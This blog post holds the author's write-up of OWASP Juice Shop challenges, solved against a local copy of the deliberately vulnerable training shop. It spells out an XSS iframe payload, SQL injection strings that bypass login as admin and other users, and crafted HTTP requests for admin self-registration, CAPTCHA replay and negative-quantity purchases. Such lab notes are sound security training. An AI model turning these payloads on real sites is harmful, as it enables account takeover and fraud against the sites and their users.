---
layout: post
title: "OWASP Juice Shop"
date: 
permalink: /notes/capture-the-flags/owasp-juice-shop
---

Notes on challenges solved, in chronological order.

# Score Board :star:

Searching for `score` in `main-es2015.js` revealed the following code amongst several other similar routing declarations. 
```js
{
    path: "score-board",
    component: Oo
}
```
Navigating to `/#/score-board` then opened the score board.


# Confidential Document :star:

The `About Us` page accessed at `/#/about` links to legal terms delivered through `/ftp/legal.md`. Navigating to `/ftp/` shows an entire directory of files, including the confidential `/ftp/acquisitions.md` file.


# Zero Stars :star:

Removing the `disabled="true"` property from the `submitButton` allows submitting a `Customer Feedback` form with zero stars.


# Error Handling :star:

Attempting to access `/ftp/eastere.gg` causes an unhandled `403 Forbidden` error. The error message `Only .md and .pdf files are allowed!` is odd considering the `.gg` file already exists.


# Privacy Policy :star:

While signed in, using the top navigation bar click `Account` > `Privacy & Security` > `Privacy Policy`. 


# DOM XSS :star:

Insert the ``<iframe src="javascript:alert(`xss\`)">`` payload into the search bar and press enter to force an alert.


# Bonus Payload :star:

Same solution as the `DOM XSS` solution, using the provided payload. Enjoy the ensuing `OWASP Juice Shop Jingle`.


# Login Admin :star::star:

We're trying to use SQL injection to trick the login. Attempting to log in with email `"` and any password gives an `Invalid email or password` response, while using `'` for the email responds `[object Object]`.

We now know that the query for validating the login is susceptible to SQL injection and starts with `'`. It's probably querying a table for the email and a matching password condition - something similar to
```sql
SELECT * FROM Users WHERE Email = 'email' AND Password = 'password'
```

By inserting `'` into the email field, our query is now invalid, and looks something like:
```sql
SELECT * FROM Users WHERE Email = ''' AND Password = 'password'
```

Inserting anything beyond the `'` in the email field will then be executed as part of the query. We can make the email field inconsequential by changing our email to `' OR TRUE` (or anything that evaluates to `TRUE`, like `1=1`). Still, our query is invalid:
```sql
SELECT * FROM Users WHERE Email = '' OR TRUE' AND Password = 'password'
```

Finally, we want our query to end after our `OR TRUE`, so we can comment the rest of the query out using `--` to ignore the rest of the line. Using `' OR TRUE --` as the email:
```sql
SELECT * FROM Users WHERE Email = '' OR TRUE --' AND Password = 'password'
```

Tada! We've commented out the password check part of the query, and made the Email check always evaluate to `TRUE`. This means we'll get all of the `Users`, and presumably log in with the first user (which happens to be `admin@juice-sh.op`).


# View Basket :star::star:

This one was awarded while fiddling with [Login Admin](#login-admin-starstar).


# Admin Section :star::star:

Searching for `admin` in `main-es2015.js` revealed the following code amongst several other similar routing declarations. 
```js
{
    path: "administration",
    component: Xi,
    canActivate: [_]
}
```
Navigating to `/#/administration` while logged in as `admin@juice-sh.op` (see [Login Admin](#login-admin-starstar)) opens the admin section.

This section reveals all of the registered users and customer feedback!


# Password Strength :star::star:

Knowing the administrator's email and that it uses a common password, it was trivial to brute force. I tried `Admin123`, followed by `admin123`. Two guesses and we're in!


# Login Bender :star::star::star:

Using the information gained from [Admin Section](#admin-section-starstar), we know that Bender's email is `bender@juice-sh.op`. 

Logging in as Bender using SQL injection is simple. We put `bender@juice-sh.op' --` as the email, making our query:
```sql
SELECT * FROM Users WHERE Email = 'bender@juice-sh.op' --' AND Password = 'password'
```

We've used Bender's actual email and bypassed the password requirement!


# Login Jim :star::star::star:

Do the same as for [Login Bender](#login-bender-starstarstar) except use `jim@juice-sh.op' --` as the email.


# Five-Star Feedback :star::star:

Navigate to the admin section as per [Admin Section](#admin-section-starstar) and click the delete button on the single piece of five star feedback.


# Exposed Metrics :star:

The [Prometheus docs](https://prometheus.io/docs/introduction/first_steps/#starting-prometheus) conveniently tell us about the endpoint served at `/metrics`. Easy solve!


# Outdated Whitelist :star:

The `GitHub` links to `/redirect?to=https://github.com/bkimminich/juice-shop`. Searching `/redirect?to=` in `main-es2015.js` reveals:
```js
data: {
    data: "bitcoin:1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm",
    url: "./redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm",
    address: "1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm",
    title: "TITLE_BITCOIN_ADDRESS"
}
```

Navigate to `/redirect?to=https://blockchain.info/address/1AbKfgvw9psQ41NbLi8kufDQTezwG8DRZm` to get redirected to a Bitcoin address explorer!


# Missing Encoding :star:

On the `/#/photo-wall` page, the missing image is `assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg`. The request for it is as follows:
```http
GET /assets/public/images/uploads/%F0%9F%98%BC- HTTP/1.1
```

Looks like the two `#` components of the URL aren't being encoded! Encoding them to `%23` fixes that up. We can access the image at `/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg`.


# Repetitive Registration :star:

Removing the `disabled="true"` from the `registerButton` allows registering a user without validation fields. Submitting a registration with mismatching passwords solves the challenge.

Alternatively, choose a matching `Repeat Password` and then modify the `Password` field. The validation for matching passwords occurs only when the `Repeat Password` field is modified.


# Upload Type :star::star::star:

Looking at the HTTP requests when submitting a complaint (with a file attached) reveals a `POST` request to upload the file:
```http
POST /file-upload HTTP/1.1
```

I crafted a request in `Postman` with a `file` key & `.png` file value pair in the request body.


# Login MC SafeSearch :star::star:

We know MC SafeSearch's email is `mc.safesearch@juice-sh.op` from looking at the registered users in the admin section. The [Protect Ya' Passwordz](https://www.youtube.com/watch?v=v59CX2DiX0Y) song reveals a few password hints:

- Name of favourite pet, Mr Noodles
- Replaced `o`'s with `0`'s

Trying a few different variations quickly got me in, with `Mr. N00dles` being the actual password.


# Admin Registration :star::star::star:

Registering a user through the usual registration form sends a `POST` request, which receives a response like so:
```json
{
    "status": "success",
    "data": {
        "username": "",
        "role": "customer",
        "deluxeToken": "",
        "lastLoginIp": "0.0.0.0",
        "profileImage": "/assets/public/images/uploads/default.svg",
        "isActive": true,
        "id": 20,
        "email": "a@ab",
        "updatedAt": "2020-08-13T01:13:46.625Z",
        "createdAt": "2020-08-13T01:13:46.625Z",
        "deletedAt": null
    }
}
```

There's a `role` field. Let's send a `POST` request which specifies the `role`. Funnily enough, no other fields are required. Not even an email and password.
```http
POST /api/Users/? HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
    "role":"admin"
}
```


# Deluxe Fraud :star::star::star:

Yoinked the bearer token from another request and attached it to this one. No need to attach a payment method to the request!

```http
POST /rest/deluxe-membership HTTP/1.1
Host: localhost:3000
Authorization: Bearer REDACTED
```


# CAPTCHA Bypass :star::star::star:

Did a couple feedback submissions through the web form. Turns out there's an incrementing `captchaId` and associated correct answer. I resent the same request over and over using the same `captchaId`.

```http
POST /api/Feedbacks/ HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
    "captchaId":0,
    "captcha":"-23",
    "rating":""
}
```


# Multiple Likes :star::star::star::star::star::star:

Literally just smashed that like button (spam clicked). I don't think this was the intended solution. Better come back to this one.


# Payback Time :star::star::star:

Adding an item to the basket sends a `PUT` request. Copied the request (token and all) and changed the quantity to a negative. Fired the request through and checked out as usual, except now the shop is buying from me! Muahaha.

```http
PUT /api/BasketItems/12 HTTP/1.1
Host: localhost:3000
Authorization: Bearer REDACTED
Content-Type: application/json

{
    "quantity":-1337
}
```